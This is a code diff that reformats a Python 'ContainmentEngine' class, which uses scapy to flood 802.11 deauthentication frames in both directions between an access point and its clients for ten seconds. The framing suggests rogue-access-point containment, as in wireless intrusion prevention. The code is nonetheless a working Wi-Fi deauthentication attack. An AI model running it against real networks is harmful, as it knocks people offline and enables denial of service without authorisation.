@@ -4,6 +4,7 @@ import config
 from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
 from config import DEAUTH_COUNT, DEAUTH_INTERVAL
 
+
 class ContainmentEngine:
 
     def __init__(self, iface):
@@ -11,51 +12,51 @@ class ContainmentEngine:
 
     def contain(self, bssid, clients, channel):
 
-      if channel is None:
-        print("[Containment] Channel unknown.")
-        return
+        if channel is None:
+            print("[Containment] Channel unknown.")
+            return
 
-    print(f"[Containment] Locking on channel {channel}")
+        print(f"[Containment] Locking on channel {channel}")
 
-    config.LOCKED_CHANNEL = channel
-    time.sleep(1)
+        config.LOCKED_CHANNEL = channel
+        time.sleep(1)
 
-    attack_duration = 10  # عدد الثواني اللي هنفضل نهاجم فيها
-    start_time = time.time()
+        attack_duration = 10
+        start_time = time.time()
 
-    while time.time() - start_time < attack_duration:
+        while time.time() - start_time < attack_duration:
+            for client in clients:
+                self.deauth_pair(bssid, client)
 
-        for client in clients:
-            self.deauth_pair(bssid, client)
-
-    config.LOCKED_CHANNEL = None
-    print("[Containment] Attack finished.")
-
+        config.LOCKED_CHANNEL = None
+        print("[Containment] Attack finished.")
 
     def deauth_pair(self, bssid, client):
 
-    # AP → Client
-      pkt1 = RadioTap() / \
-        Dot11(addr1=client,
-              addr2=bssid,
-              addr3=bssid) / \
-        Dot11Deauth(reason=7)
+        pkt1 = (
+            RadioTap() /
+            Dot11(addr1=client,
+                  addr2=bssid,
+                  addr3=bssid) /
+            Dot11Deauth(reason=7)
+        )
 
-    # Client → AP
-      pkt2 = RadioTap() / \
-        Dot11(addr1=bssid,
-              addr2=client,
-              addr3=bssid) / \
-        Dot11Deauth(reason=7)
+        pkt2 = (
+            RadioTap() /
+            Dot11(addr1=bssid,
+                  addr2=client,
+                  addr3=bssid) /
+            Dot11Deauth(reason=7)
+        )
 
-      sendp(pkt1,
-          iface=self.iface,
-          count=DEAUTH_COUNT,
-          inter=DEAUTH_INTERVAL,
-          verbose=False)
+        sendp(pkt1,
+              iface=self.iface,
+              count=DEAUTH_COUNT,
+              inter=DEAUTH_INTERVAL,
+              verbose=False)
 
-      sendp(pkt2,
-          iface=self.iface,
-          count=DEAUTH_COUNT,
-          inter=DEAUTH_INTERVAL,
-          verbose=False)
+        sendp(pkt2,
+              iface=self.iface,
+              count=DEAUTH_COUNT,
+              inter=DEAUTH_INTERVAL,
+              verbose=False)
